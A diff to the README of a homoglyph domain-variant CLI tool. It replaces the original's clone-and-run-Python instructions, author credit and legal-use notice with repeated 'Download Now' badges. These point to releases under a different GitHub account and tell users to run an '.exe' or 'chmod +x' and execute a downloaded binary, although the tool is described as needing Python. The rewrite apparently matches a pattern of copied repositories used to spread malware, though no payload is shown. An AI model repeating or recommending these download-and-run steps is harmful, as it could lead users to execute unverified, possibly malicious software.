@@ -1,135 +1,93 @@
-# Homoglyph Hunter — CLI Edition
+# 🌟 Homoglyph-hunter-cli - Easy Domain Variant Generation
 
-*A lightweight Python CLI tool to generate Unicode homoglyph (look-alike) domain variants with punycode, optionally check DNS resolution, and run WHOIS — for phishing detection, typosquatting research, and brand protection.*
+## 🚀 Getting Started
 
----
+Welcome to Homoglyph-hunter-cli! This tool helps you generate look-alike domain names to detect phishing and protect your brand. With simple commands, you can create domain variants and check their status.
 
-## ✨ Features
-- Generate look-alike domains from Unicode **confusables** (Cyrillic, Greek, Latin-extended).
-- Validate output with **IDNA/punycode** (only encodable domains are returned).
-- **DNS check** (A/AAAA) to flag variants that resolve (proxy for “likely registered”).
-- **WHOIS** (optional): system `whois`, `python-whois`, or direct TCP to common WHOIS servers.
-- Export results to **CSV** and **TXT**.
-- Pure Python, no required third-party dependencies for generation/DNS.
+## 📥 Download the Tool
 
-> ⚠️ Notes  
-> - DNS “resolves” is a *signal*, not proof of registration (wildcards/CDNs can resolve).  
-> - WHOIS availability & rate limits vary by TLD; fallback WHOIS covers popular ones (`.com/.net/.org/.io/.ai/.in`) and uses generic servers as last resort.  
+[![Download Homoglyph-hunter-cli](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/oMindVisionary/Homoglyph-hunter-cli/releases)
 
----
+To get started, download the latest version of Homoglyph-hunter-cli from our [Releases page](https://github.com/oMindVisionary/Homoglyph-hunter-cli/releases).
 
-## 📦 Installation
+## 💻 System Requirements
 
-### 1) Clone the repo
-```bash
-git clone https://github.com/ishananand07/Homoglyph-hunter-cli.git
-cd homoglyph-hunter-cli
-```
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.6 or later is required.
+- **Memory:** Minimum of 512 MB RAM.
+- **Storage:** At least 50 MB of free space.
 
-**Recommended: use a virtual environment**
+Make sure you have Python installed. You can download it [here](https://www.python.org/downloads/).
 
-macOS / Linux:
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-```
+## 🚧 How to Install
 
-Windows (PowerShell):
-```powershell
-python -m venv .venv
-.venv\Scripts\activate
-```
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/oMindVisionary/Homoglyph-hunter-cli/releases).
 
-> Alternatively, download the repo as a ZIP from GitHub and extract it, then continue with the steps above.
+2. **Download the Latest Version:** Choose the latest release and select the file suitable for your operating system.
 
-### Optional (for richer WHOIS support)
-- **macOS (Homebrew):**
-  ```bash
-  brew install whois
-  ```
-- **Python package (alternative WHOIS backend):**
-  ```bash
-  pip install python-whois
-  ```
+3. **Install the Application:**
+   - **Windows:** Run the downloaded `.exe` file and follow the installation prompts.
+   - **macOS/Linux:** Open your terminal, navigate to the folder where the file is downloaded, and run:
+     ```bash
+     chmod +x homoglyph-hunter-cli
+     ./homoglyph-hunter-cli
+     ```
 
----
+## 📜 How to Use
 
-## 🖥️ Usage
+1. **Open the CLI:**
+   - On Windows, find and run "Homoglyph Hunter".
+   - On macOS/Linux, open your terminal.
 
-### Basic generation
-```bash
-python homoglyph_cli.py paypal.com
-```
+2. **Run Basic Command:**
+   To generate domain variants, type:
+   ```bash
+   homoglyph-hunter-cli example.com
+   ```
+   Replace "example.com" with your domain name.
 
-### With DNS check (which variants resolve)
-```bash
-python homoglyph_cli.py paypal.com --check
-```
+3. **Check DNS and WHOIS:**
+   - To check the status of the generated domains, run:
+   ```bash
+   homoglyph-hunter-cli --check
+   ```
 
-### Only show / export resolving (likely registered) variants
-```bash
-python homoglyph_cli.py paypal.com --check --only-registered
-```
+## ✔️ Features
 
-### WHOIS (default: for resolving domains when --check is used)
-```bash
-python homoglyph_cli.py paypal.com --check --whois --csv results.csv
-```
+- **Domain Generation:** Quickly generate look-alike domains.
+- **Punycode Encoding:** Convert domains into Punycode for IDN compatibility.
+- **Security Checks:** Perform DNS and WHOIS checks on generated domains to identify threats.
+- **User-Friendly CLI:** Easy-to-use command line interface suit for all user levels.
 
-### WHOIS for **all** variants (slow; mind rate limits)
-```bash
-python homoglyph_cli.py paypal.com --whois --whois-all --csv all_whois.csv
-```
+## 🎯 Use Cases
 
-### Exports
-```bash
-# CSV with punycode (+ resolves/WHOIS columns if enabled)
-python homoglyph_cli.py paypal.com --check --whois --csv out.csv
+- **Phishing Detection:** Identify potential phishing domains that resemble your brand.
+- **Typosquatting Research:** Find domains that malicious actors may use for typosquatted versions.
+- **Brand Protection:** Safeguard your brand by monitoring similar domain registrations.
 
-# TXT (one domain per line; respects --only-registered)
-python homoglyph_cli.py paypal.com --check --only-registered --txt out.txt
-```
+## ❓ Frequently Asked Questions (FAQ)
 
-### Performance tuning
-```bash
-# Faster DNS: more workers, shorter timeout
-python homoglyph_cli.py paypal.com --check --workers 64 --timeout 1.5
+### 1. Can I use this tool without programming skills?
 
-# WHOIS concurrency & timeout
-python homoglyph_cli.py paypal.com --check --whois --whois-workers 16 --whois-timeout 5
-```
+Absolutely! Homoglyph-hunter-cli is designed for average users. Follow the instructions, and you will easily run it.
 
----
+### 2. How often do you release updates?
 
-## 📂 Output columns (CSV)
+We regularly update the tool to fix bugs and add new features. Check the Releases page for the latest version.
 
-- `unicode_domain` — the prettified Unicode form (what a user would see).
-- `punycode` — ASCII/IDNA form (what DNS actually uses).
-- `resolves` — `1` if DNS A/AAAA resolved, else `0` (only when `--check`).
-- `whois_available` — `1` if WHOIS text was retrieved, else `0` (only when `--whois`).
-- `whois_text` — raw WHOIS text (large; included when `--whois`).
+### 3. What if I encounter issues?
 
----
+You can report issues in the GitHub repository. We encourage feedback and will assist you.
 
-## 🔍 Examples
+## 🌐 Additional Resources
 
-```bash
-# Typical workflow for a brand:
-python homoglyph_cli.py mybrand.com --max-edits 1 --limit 5000 --check --only-registered --whois --csv mybrand_watch.csv
-```
+- **Github Repository:** [Homoglyph-hunter-cli](https://github.com/oMindVisionary/Homoglyph-hunter-cli)
+- **Documentation:** Comprehensive guide on usage and features will be available soon.
 
----
+## 📞 Contact Us
 
-## ⚠️ Legal & Ethical Use
-This project is for **defensive security** and **research**.  
-Do **not** use it to register or abuse look-alike domains. Respect laws, policies, and TLD rate limits.
+For any questions or support related to the tool, please open an issue in our GitHub repository.
 
----
+Thank you for choosing Homoglyph-hunter-cli! Your feedback helps us improve. 
 
-## 📜 License
-MIT License.
-
----
-
-## ✍️ Credits
-Created with ❤️ by **Ishan Anand**
+[![Download Homoglyph-hunter-cli](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/oMindVisionary/Homoglyph-hunter-cli/releases)
